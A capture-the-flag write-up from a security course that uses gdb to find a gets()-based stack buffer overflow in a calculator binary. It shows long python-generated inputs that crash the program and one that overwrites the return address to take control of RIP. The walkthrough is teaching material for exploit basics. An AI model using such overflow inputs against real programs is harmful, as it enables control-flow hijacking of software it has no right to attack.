### Fuzzy calculator
>Our startup has developed an advanced calculator app for 64-bit Linuxes. Unfortunately, the app has a serious memory safety problem. What is more, our competitors have a similar products without these kind of problems. We have act quickly before the market reacts and gets too much stacked against us. Can you trace down the exact point where the problem occurs? http://sec-mooc-1.cs.helsinki.fi/clock/a2f79db3-c910-482e-baa2-b4da7b3caa99/clock (Note that the address should include all leading zeroes and the hexadecimal prefix e.g. 0x0000000000000001)

The title of the challenge suggests fuzzing but after messing around with it a few times and seeing it wasn't very complicated I decided to look at it in gdb.
```
root@kali:~/temp/fuzzy# gdb ./clock
...
(gdb) set disassembly-flavor intel
(gdb) disass main
Dump of assembler code for function main:
   0x0000000000400256 <+0>:	push   rbp
   0x0000000000400257 <+1>:	mov    rbp,rsp
   0x000000000040025a <+4>:	sub    rsp,0x138b0
   0x0000000000400261 <+11>:	mov    DWORD PTR [rbp-0x138a4],edi
   0x0000000000400267 <+17>:	mov    QWORD PTR [rbp-0x138b0],rsi
   0x000000000040026e <+24>:	mov    edi,0x407660
   0x0000000000400273 <+29>:	call   0x4006d9 <puts>
   0x0000000000400278 <+34>:	mov    edi,0x407688
   0x000000000040027d <+39>:	call   0x4006d9 <puts>
   0x0000000000400282 <+44>:	lea    rax,[rbp-0x138a0]
   0x0000000000400289 <+51>:	mov    rdi,rax
   0x000000000040028c <+54>:	mov    eax,0x0
   0x0000000000400291 <+59>:	call   0x4005f6 <gets>
... 
```
What immediately jumped out to me was the `gets` call. `gets` reads a line from stdin and saves it to a buffer but doesn't check if the buffer is big enough. This causes a buffer overflow if the string is too long.

Funnily enough first I was so excited seeing `gets` within like a minute of downloading the challenge that I didn't look at how big the buffer actually was. The command `sub    rsp,0x138b0` sets up the stack for the buffer by substracting `0x138b0`  (`80048` in decimal) from the stack pointer. 

So after a few attempts to make it crash without success I went back to see just how big the buffer was and only then realised to craft a long enough input.
```
root@kali:~/temp/fuzzy# python -c 'print "1" * 90000' | ./clock
Welcome to the cyber calculator!
Please type a calculation to proceed. (For example 1+1)
Segmentation fault
```
There's a crash and now for the flag we need to get a memory address. We can use GDB for this but because the calculator takes input from stdin we first need to write our input to a file and then redirect the file as input inside GDB:

```
root@kali:~/temp/fuzzy# python -c 'print "1" * 90000' > ff
root@kali:~/temp/fuzzy# gdb clock
...
(gdb) r < ff
Starting program: /root/temp/fuzzy/clock < ff
Welcome to the cyber calculator!
Please type a calculation to proceed. (For example 1+1)

Program received signal SIGSEGV, Segmentation fault.
0x0000000000403670 in memcpy ()
```
And we get our flag, `0x0000000000403670`. 


#### Commentary:

I got lucky in that in my manual testing I put in a long enough input for the program to crash at memcpy to actually get the flag. Many people in the IRC/Matrix channel had problems because they got the program to crash but at a different point.

If your input is shorter than ~83500 characters but longer than 80040 you won't overflow enough and start getting a different crash. The crash will happen at the very end of the program where it's about to return from main.

Let's give an input of `"1" * 81000`:

```
root@kali:~/temp/fuzzy# python -c 'print "1"*81000' > ff
root@kali:~/temp/fuzzy# gdb clock
...
(gdb) r < ff
Starting program: /root/temp/fuzzy/clock < ff
Welcome to the cyber calculator!
Please type a calculation to proceed. (For example 1+1)
error

Program received signal SIGSEGV, Segmentation fault.
0x000000000040041c in main ()
(gdb) x/i 0x000000000040041c
=> 0x40041c <main+454>:	retq
(gdb) x/xg $rsp
0x7fffffffe258:	0x3131313131313131
```

So we are crashing at the very end of the program when main is about to return. The reason why we are crashing here is that `ret` is popping a value from stack (at RSP, the stack pointer) and is trying to put it as instruction pointer (RIP). But in x86-64 the maximum address size is `0x00007FFFFFFFFFFF` so `0x3131313131313131` is not a valid address. The address is not allowed so we crash at the `ret` instruction.

Now if we craft our overflow to have a valid address for RIP we actually take control of it:
```
root@kali:~/temp/fuzzy# python -c 'print "1"*80040 + "2" * 6 '> ff
root@kali:~/temp/fuzzy# gdb clock
...
(gdb) r < ff
Starting program: /root/temp/fuzzy/clock < ff
Welcome to the cyber calculator!
Please type a calculation to proceed. (For example 1+1)
error

Program received signal SIGSEGV, Segmentation fault.
0x0000323232323232 in ?? ()
```
0x32 = "2" and because of endianness "222222" ends up being "0x0000323232323232".

Note that the above only applies to x86-64 and with 32 bit binaries things are a bit (heh) different.

